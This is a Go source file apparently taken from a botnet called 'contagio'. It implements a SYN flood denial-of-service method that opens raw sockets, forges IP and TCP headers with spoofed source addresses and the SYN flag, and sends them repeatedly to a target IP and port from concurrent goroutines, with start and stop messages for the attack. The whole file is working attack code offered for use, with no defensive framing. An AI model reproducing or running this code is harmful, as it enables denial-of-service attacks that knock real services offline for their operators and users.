package methods

import (
	"contagio/bot/config"
	"contagio/bot/utils"
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"syscall"
	"time"
)

func SynMethod(ctx context.Context, ipaddr string, _port string) {
	defer Catch()

	if config.DEBUG {
		fmt.Println("[syn] Attack started")
	}

	port, err := strconv.Atoi(_port)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[syn atoi] Port atoi error: " + err.Error())
		}
		return
	}

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[syn flood] Can't open raw socket")
		}
		return
	}
	syscall.Close(fd)

	for {
		select {
		case <-ctx.Done():
			if config.DEBUG {
				fmt.Println("[syn flood] Attack stopped")
			}
			return
		case <-utils.StopChan:
			if config.DEBUG {
				fmt.Println("[syn flood] Cpu balancer")
			}
			time.Sleep(5 * time.Second)
		default:

			go syn(net.ParseIP(ipaddr).To4(), port)
			go syn(net.ParseIP(ipaddr).To4(), port)
			go syn(net.ParseIP(ipaddr).To4(), port)
			go syn(net.ParseIP(ipaddr).To4(), port)
			go syn(net.ParseIP(ipaddr).To4(), port)

			time.Sleep(50 * time.Millisecond)
		}
	}
}

func syn(ip net.IP, port int) {
	defer Catch()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[syn flood] Can't open raw socket")
		}
		return
	}
	defer syscall.Close(fd)

	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		return
	}

	rand.NewSource(time.Now().UnixNano())

	srcIP := net.IP(make([]byte, 4))
	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<10-1)))

	ipv4Byte := CreateIpHeader(srcIP, ip)
	tcpByte := CreateTcpHeader(srcIP, ip, port, 0x02)

	buffs := make([]byte, 0)
	buffs = append(buffs, ipv4Byte...)
	buffs = append(buffs, tcpByte...)

	addr := syscall.SockaddrInet4{
		Port: port,
	}
	copy(addr.Addr[:4], ip)

	syscall.Sendto(fd, buffs, 0, &addr)

}

func (h *TCPHeader) Marshal() []byte {
	defer Catch()

	if h == nil {
		return nil
	}

	hdrlen := 20 + len(h.Options)
	b := make([]byte, hdrlen)

	binary.BigEndian.PutUint16(b[0:2], h.SourcePort)
	binary.BigEndian.PutUint16(b[2:4], h.DestinationPort)

	binary.BigEndian.PutUint32(b[4:8], h.SequenceNumber)
	binary.BigEndian.PutUint32(b[8:12], h.AckNumber)

	b[12] = uint8(hdrlen / 4 << 4)
	b[13] = uint8(h.Flags)

	binary.BigEndian.PutUint16(b[14:16], uint16(h.WindowSize))
	binary.BigEndian.PutUint16(b[16:18], uint16(h.Checksum))
	binary.BigEndian.PutUint16(b[18:20], uint16(h.UrgentPointer))

	if len(h.Options) > 0 {
		copy(b[20:], h.Options)
	}

	return b
}
